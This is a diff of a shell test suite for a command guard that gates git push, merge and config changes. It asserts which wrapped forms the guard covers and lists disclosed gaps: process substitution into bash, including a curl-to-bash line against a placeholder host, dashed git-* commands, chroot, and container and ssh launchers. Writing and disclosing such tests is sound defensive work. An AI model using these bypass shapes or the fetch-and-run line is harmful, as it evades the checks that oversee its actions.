+  "cat <<< '<cmd>' | bash" surface_text
+assert_output "COVERED states process substitution" "cat <(git push origin main)" surface_text
+assert_output "  and says which process-substitution shape is a GAP instead" \
+  "bash <(echo 'git push')" surface_text
+assert_output "COVERED says the SUBCOMMAND is normalised too, not only the command word" \
+  "git \$'push'" surface_text
+assert_output "GAPS names the container/VM launchers as out of scope" \
+  "docker run ... git push" surface_text
+assert_output "GAPS names the dashed git-<sub> form" "git-push origin main" surface_text
+assert_output "GAPS names the two positional-consuming launchers, and no others" \
+  "chroot /newroot git push" surface_text
+assert_output "  and says the flag-operand launchers are covered, not gapped" \
+  "are covered, not gapped" surface_text
 
 t_case "AC-019/SEC-02 every launcher --surface NAMES is really treated as a launcher"
 # Drives the PRINTED list against the BEHAVIOUR, name by name. What it catches: a name added to the
@@ -1151,6 +1580,36 @@ mg_gap "an identity change via sed -i"       'sed -i "" "s/ci@/x@/" ~/.gitconfig
 mg_gap "git config --edit (an editor, not a value)" 'git config --global --edit'
 mg_gap "firm-integrate merges internally, by its own allowlist" \
                                              'firm-integrate 20260803T120043Z-slug wo-a wo-b'
+# ---- gaps NAMED for the first time in this wave. Each is a form the fix wave did NOT close, so it
+# is disclosed rather than left silent — silence in this list is the defect SEC-02 was raised for.
+# `bash <(echo '<cmd>')` looks like the process substitution now covered above, and is not: there the
+# gated text is INSIDE the parens, here it is the OUTPUT of what is inside them, which the guard
+# would have to RUN to see. Same class as `echo 'git push' | bash`, which was already declared.
+mg_gap "process substitution feeding a shell (the OUTPUT is the script)" \
+                                             "bash <(echo 'git push origin main')"
+mg_gap "  and the curl form of the same shape" 'bash <(curl -s https://example.invalid/x)'
+mg_gap "the DASHED builtin form: git-push"   'git-push origin main'
+mg_gap "  git-merge"                         'git-merge feature/x'
+mg_gap "  git-config (dashed identity write)" 'git-config --global user.email a@b.c'
+mg_gap "third-party git-* porcelain"         'git-lfs push origin main'
+mg_gap "a launcher whose command follows a POSITIONAL it consumes: chroot <dir> cmd" \
+                                             'chroot /newroot git push origin main'
+mg_gap "  and with an absolute path to git behind it" \
+                                             'chroot /newroot /usr/bin/git push origin main'
+# ...and the boundary of THAT gap is asserted, not assumed: the neighbouring launchers whose operands
+# are FLAGS are COVERED, so the gap is a shape (a consumed positional), not a set of names. Without
+# these three the gap line above would read as "these launchers do not work", which is false — and
+# claiming LESS coverage than exists is the same kind of dishonesty as claiming more.
+assert_rc "not a gap: nsenter's operands are flags, so the command word resolves" 1 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'nsenter -t 1 -m /usr/bin/git push origin main'
+assert_rc "not a gap: systemd-run --unit=x resolves" 1 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'systemd-run --unit=x /usr/bin/git push origin main'
+assert_rc "not a gap: setpriv --reuid=1000 resolves" 1 \
+  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'setpriv --reuid=1000 git push origin main'
+mg_gap "a container launcher (different fs + identity context)" \
+                                             'docker run --rm -v .:/r alpine git push origin main'
+mg_gap "  podman run"                        'podman run --rm alpine git push origin main'
+mg_gap "a remote launcher over ssh"          "ssh host 'git push origin main'"
 assert_rc "GAP: a heredoc body fed to a NON-shell is skipped" 0 \
   mg "$TREE" "$GH_OK" "$REPO_BAD" --command "python3 - <<'PY'
 print('git push origin main')
